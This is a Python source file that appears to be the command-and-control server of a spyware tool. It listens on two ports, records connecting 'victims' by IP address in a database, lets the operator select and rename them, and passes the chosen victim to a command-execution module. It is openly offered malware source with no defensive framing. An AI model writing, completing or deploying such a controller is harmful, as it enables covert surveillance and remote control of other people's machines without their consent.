
# Write a description for the module and write credits

# Module imports
import socket, threading, time

# Local imports
from graphics import *
from other_func import *
from exec_command import ExecuteCommands
from handle_db import Database
from communicate import CheckConnection

# Variables
HOST = ''
PORT = 55555
DATA_PORT = 44444


class Spyware(object):

    def __init__(self):
        # Class variables
        self.online = {}
        self.online_size = len(self.online.keys())
        self.check_conn_obj = {}
        self.selected = {}

        self.switch = True
        self.refresh_sc = True
        self.input_thread = True
        self.database = Database()

    def accept_conns(self):
        # Thread running here forever.
        while True:
            main_conn, addr = main_sock.accept()
            data_conn, _ = data_sock.accept()

            stored_name = self.database.find(addr[0])[0]
            name = stored_name if stored_name else random_name()

            if stored_name == None:
                self.database.insert(name, addr[0])

            elif stored_name in self.online:
                main_conn.close()
                data_conn.close()
                continue

            self.online[name] = [addr[0], main_conn, data_conn]
            self.check_conn_obj[name] = threading.Thread(target=CheckConnection.check_conn, args=(name, self.online[name], my_spyware))
            self.check_conn_obj[name].start()

    def pick_victim(self):

        while self.switch:

            if len(self.online.keys()) > self.online_size or self.refresh_sc:
                clear_screen()
                self.refresh_sc = False

                print(ascii_logo)
                rename_desc = " - Type 'rename' to rename a victim!"
                select_desc = " - Type the nickname of a victim you want to select!"

                print(beautify(rename_desc, '=', 'top', len(select_desc)))
                print(beautify(select_desc, '=', 'bottom'), end='\n\n')

                for victim in self.online:
                    print(f" + {victim} + connected on \"{self.online[victim][0]}\"")

                self.online_size = len(self.online.keys())

            elif self.input_thread:
                self.input_thread = False
                inp_thread = threading.Thread(target=self.get_input)
                inp_thread.start()

    def get_input(self):

        while self.switch:
            user_inp = input('\n >>> ')

            if user_inp in self.online.keys():
                self.selected[user_inp] = self.online[user_inp]
                self.switch = False

            elif user_inp.lower() == 'rename':
                name = input("\n Type the name of the victim you wish to rename > ")

                if name in self.online.keys():
                    new_name = input(f"\n Type a new name for {name} > ")

                    if new_name and new_name != name:
                        self.database.update(new_name, name)
                        self.online[new_name] = self.online[name]
                        del self.online[name]
                    else:
                        invalid_inp()

                    self.refresh_sc = True
                else:
                    invalid_inp()
            else:
                self.refresh_sc = True
                time.sleep(0.1)
        input("inp_out")




if __name__ == '__main__':

    main_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    main_sock.bind((HOST, PORT))

    data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#
    data_sock.bind((HOST, DATA_PORT))

    main_sock.listen(5)
    data_sock.listen(5)

    my_spyware = Spyware()
    listener = threading.Thread(target=my_spyware.accept_conns)
    listener.start()

    while True:
        # Resetting our boolean 'switches' for my_spyware object
        my_spyware.switch = True
        my_spyware.input_thread = True
        my_spyware.refresh_sc = True
        my_spyware.pick_victim()

        execute = ExecuteCommands(my_spyware.selected)
        execute.pick_command()

